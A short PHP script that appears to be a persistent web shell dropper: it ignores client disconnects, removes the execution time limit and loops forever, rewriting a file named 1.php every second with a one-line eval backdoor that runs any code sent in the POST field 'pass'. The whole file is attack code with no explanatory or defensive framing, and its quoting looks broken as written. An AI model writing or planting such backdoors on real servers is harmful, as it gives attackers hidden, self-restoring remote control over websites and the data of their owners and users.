<?php

ignore_user_abort();
set_time_limit(0);
while (True) {
	if (!file_exists('1.php')){
		file_put_contents('1.php', "<?php @eval(\$_POST["pass"]);?>");
	}
	sleep(1);
}
?>
